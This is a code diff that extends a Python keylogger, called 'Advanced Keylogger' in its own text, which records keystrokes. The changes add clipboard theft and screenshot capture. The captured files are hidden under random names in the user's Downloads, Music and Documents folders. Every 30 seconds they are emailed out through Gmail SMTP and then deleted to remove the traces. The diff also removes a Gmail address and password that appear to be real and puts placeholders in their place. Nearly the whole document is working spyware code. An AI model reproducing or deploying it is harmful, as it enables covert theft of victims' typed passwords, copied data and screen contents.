@@ -13,6 +13,9 @@ import os
 import time
 import random
 
+from PIL import ImageGrab
+import win32clipboard
+
 from pynput.keyboard import Key, Listener
 import threading
 
@@ -34,8 +37,10 @@ logged_data.append(default_msg)
 
 delete_file = []
 
-EMAIL_ADDRESS = "deepsdog00@gmail.com"
-EMAIL_PASSWORD = "hcemjlnayedkgezs"
+EMAIL_ADDRESS = "your_email@gmail.com"
+EMAIL_PASSWORD = "your_password OR token"
+
+count = 1
 
 
 def on_press(key):
@@ -57,14 +62,83 @@ def on_release(key):
         return False
 
 
-def write_file(count):
+def send_email():
+    subject = f"[{user}] ~ Logs"
+    msg = MIMEMultipart()
+    msg['From'] = EMAIL_ADDRESS
+    msg['To'] = EMAIL_ADDRESS
+    msg['Subject'] = subject
+    body = 'Advanced Keylogger\n\nPFA:\n\t1) Log File\n\t2) Clipboard Data\n\t3) Current Screenshot\n'
+    msg.attach(MIMEText(body, 'plain'))
+    
+    for file in delete_file:
+        filename = file.split('/')[2]
+        attachment = open(file, 'rb')
+        
+        p = MIMEBase('application', 'octet-stream')
+        p.set_payload((attachment).read())
+        encoders.encode_base64(p)
+        p.add_header('content-disposition', 'attachment;filename='+str(filename))
+        msg.attach(p)
+    
+    text = msg.as_string()
+    
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.ehlo()
+    server.starttls()
+    server.ehlo()
+    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+    server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, text)
+    
+    attachment.close()
+    server.quit()
+
+
+def random_file_path():
     one = os.path.expanduser('~') + '/Downloads/'
     two = os.path.expanduser('~') + '/Music/'
-    three = os.path.expanduser('~') + '/Documents'
+    three = os.path.expanduser('~') + '/Documents/'
     
     list = [one, two, three]
     filepath = random.choice(list)
-    filename = str(count) + 'X' + str(random.randint(1000000000, 9999999999)) + '.txt'
+    
+    return filepath
+
+
+def clipboard():
+    filepath = random_file_path()
+    filename = str(count) + 'l' + str(random.randint(1000000000, 9999999999)) + '.txt'
+    
+    file = filepath + filename
+    delete_file.append(file)
+    
+    with open(file, 'a') as f:
+        try:
+            win32clipboard.OpenClipboard()
+            copied_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            
+            f.write('[##### Clipboard Data #####]\n\n' + copied_data)
+            
+        except:
+            f.write('[Clipboard Data either empty or could not be copied.]')
+
+
+def screenshot():
+    filepath = random_file_path()
+    filename = str(count) + 'l' + str(random.randint(1000000000, 9999999999)) + '.png'
+    
+    file = filepath + filename
+    delete_file.append(file)
+    
+    im = ImageGrab.grab()
+    im.save(file)
+     
+
+
+def log_file():
+    filepath = random_file_path()
+    filename = str(count) + 'l' + str(random.randint(1000000000, 9999999999)) + '.txt'
     
     file = filepath + filename
     delete_file.append(file)
@@ -74,44 +148,21 @@ def write_file(count):
 
 
 def send_logs():
-    count = 1
+    global count
     
     time.sleep(30)
     while True:
         if len(logged_data) > 1:
             try:
-                write_file(count)
+                log_file()
+                clipboard()
+                screenshot()
                 
-                subject = f"[{user}] ~ {count}"
-                msg = MIMEMultipart()
-                msg['From'] = EMAIL_ADDRESS
-                msg['To'] = EMAIL_ADDRESS
-                msg['Subject'] = subject
-                body = 'Advanced Keylogger test'
-                msg.attach(MIMEText(body, 'plain'))
+                send_email()
                 
-                attachment = open(delete_file[0], 'rb')
-                filename = delete_file[0].split('/')[2]
-                
-                p = MIMEBase('application', 'octet-stream')
-                p.set_payload((attachment).read())
-                encoders.encode_base64(p)
-                p.add_header('content-disposition', 'attachment;filename='+str(filename))
-                msg.attach(p)
-                
-                text = msg.as_string()
-                
-                server = smtplib.SMTP('smtp.gmail.com', 587)
-                server.ehlo()
-                server.starttls()
-                server.ehlo()
-                server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
-                server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, text)
-                
-                attachment.close()
-                server.quit()
-                
-                os.remove(delete_file[0])
+                for file in delete_file:
+                    os.remove(file)
+                    
                 del logged_data[1:]
                 del delete_file[0:]
                 
